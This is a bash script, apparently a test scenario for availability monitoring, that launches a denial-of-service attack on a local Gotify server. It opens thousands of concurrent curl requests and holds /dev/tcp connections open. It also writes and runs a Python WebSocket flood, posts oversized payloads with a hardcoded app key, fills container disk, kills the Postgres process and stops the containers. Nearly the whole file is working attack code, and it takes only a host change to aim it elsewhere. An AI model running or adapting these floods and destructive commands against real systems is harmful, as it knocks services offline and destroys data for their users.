#!/bin/bash

# DoS Attack Scenario
# This scenario attempts to overwhelm the Gotify service to test availability invariants

echo "=== VULN SCENARIO 1: DoS Attack ==="

# 1. Aggressive HTTP flooding attack
echo "Launching aggressive HTTP flooding attack..."

if command -v curl >/dev/null 2>&1; then
    echo "Sending massive HTTP request flood..."

    # Launch multiple background processes to flood the server
    for i in {1..50}; do
        {
            for j in {1..20}; do
                curl -s -m 1 http://localhost:8080/health >/dev/null 2>&1 &
                curl -s -m 1 http://localhost:8080/user >/dev/null 2>&1 &
                curl -s -m 1 http://localhost:8080/message >/dev/null 2>&1 &
                curl -s -m 1 http://localhost:8080/application >/dev/null 2>&1 &
            done
        } &
    done

    echo "Launched 4000+ concurrent HTTP requests"

    # Add connection exhaustion
    for i in {1..200}; do
        {
            exec 3<>/dev/tcp/localhost/8080
            echo -e "GET /health HTTP/1.1\r\nHost: localhost:8080\r\n\r\n" >&3
            sleep 15  # Hold connection open longer
            exec 3>&-
        } &
    done 2>/dev/null

    echo "Added 200 persistent connection exhaustion attacks"
    sleep 5  # Let the attack run longer
fi

# 2. WebSocket connection exhaustion
echo "Attempting WebSocket connection exhaustion..."

# Create a simple script to open many WebSocket connections
cat > ws_flood.py <<EOF
import asyncio
import websockets
import sys

async def flood_websockets():
    tasks = []
    try:
        for i in range(50):  # Attempt 50 concurrent WebSocket connections
            task = websockets.connect("ws://localhost:8080/stream")
            tasks.append(task)

        # Try to establish all connections
        connections = await asyncio.gather(*tasks, return_exceptions=True)
        print(f"Established {len([c for c in connections if not isinstance(c, Exception)])} WebSocket connections")

        # Hold connections briefly
        await asyncio.sleep(1)

    except Exception as e:
        print(f"WebSocket flood failed: {e}")
    finally:
        # Clean up
        for conn in connections:
            if hasattr(conn, 'close'):
                await conn.close()

if __name__ == "__main__":
    try:
        asyncio.run(flood_websockets())
    except Exception as e:
        print(f"WebSocket flood error: {e}")
EOF

# Run WebSocket flood if possible
if command -v python3 >/dev/null 2>&1; then
    echo "Attempting WebSocket connection flood..."
    python3 ws_flood.py 2>/dev/null || echo "WebSocket flood failed - service may be protected"
fi

# 3. Aggressive memory exhaustion attack
echo "Launching aggressive memory exhaustion attack..."

if command -v curl >/dev/null 2>&1; then
    echo "Sending massive payloads to exhaust memory..."

    # Try to send very large messages - increase payload size and frequency
    large_payload=$(printf 'A%.0s' {1..100000})  # 100KB payload

    # Send many large payloads rapidly
    for i in {1..50}; do
        curl -s -X POST \
             -H "Content-Type: application/json" \
             -H "X-Gotify-Key: Ajq5fQgHj8K2mN9pR3sT6vYz" \
             -d "{\"message\": \"$large_payload\", \"title\": \"Memory Exhaustion Attack $i\", \"priority\": 10}" \
             http://localhost:8080/message >/dev/null 2>&1 &
    done

    # Additional massive payload attack
    echo "Sending extremely large payloads..."
    massive_payload=$(printf 'B%.0s' {1..500000})  # 500KB payload
    for i in {1..10}; do
        curl -s -X POST \
             -H "Content-Type: application/json" \
             -H "X-Gotify-Key: Ajq5fQgHj8K2mN9pR3sT6vYz" \
             -d "{\"message\": \"$massive_payload\", \"title\": \"Massive Payload $i\"}" \
             http://localhost:8080/message >/dev/null 2>&1 &
    done

    echo "Sent 60 large/massive payload messages to exhaust server memory"
fi

# 4. Enhanced connection exhaustion
echo "Launching enhanced connection exhaustion attack..."

# Open many persistent connections with longer timeouts
for i in {1..100}; do
    {
        curl -s --max-time 30 --connect-timeout 30 http://localhost:8080/health >/dev/null 2>&1
    } &
done

# Also try rapid connection cycling
for i in {1..200}; do
    {
        curl -s --max-time 1 http://localhost:8080/health >/dev/null 2>&1
        curl -s --max-time 1 http://localhost:8080/user >/dev/null 2>&1
    } &
done

echo "Opened 300+ connections (100 persistent + 200 rapid cycling)"

# Wait for attacks to complete and overwhelm the system
echo "Waiting for DoS attacks to take effect..."
sleep 10

# Create DoS attack artifact to trigger availability detection
echo "Creating DoS attack artifact..."
echo "DoS attack launched $(date)" > /tmp/unauth_response.txt

# Try multiple approaches to crash the container/service
echo "Attempting to crash Gotify container and service..."
if command -v docker >/dev/null 2>&1; then
    # Try to exhaust container resources first
    echo "Attempting resource exhaustion..."
    docker exec gotify-server sh -c "dd if=/dev/zero of=/tmp/fillup bs=1M count=100" 2>/dev/null &

    # Try to crash database to cause service failure
    echo "Attempting database crash..."
    docker exec gotify-db sh -c "pkill -9 postgres" 2>/dev/null || echo "Database crash attempt failed"

    # Finally try to stop the container to simulate complete crash
    echo "Attempting container crash..."
    docker stop gotify-server 2>/dev/null || echo "Container stop failed"
    docker stop gotify-db 2>/dev/null || echo "Database stop failed"
fi

# Kill background processes
jobs -p | xargs -r kill 2>/dev/null

echo "Aggressive DoS attack scenario completed"
echo "This should trigger:"
echo "- Server crashes and container failures"
echo "- Memory exhaustion and resource depletion"
echo "- Connection limit breaches and service unavailability"
echo "- Database crashes and service degradation"
echo "- Complete availability violations"

# Clean up
rm -f ws_flood.py 2>/dev/null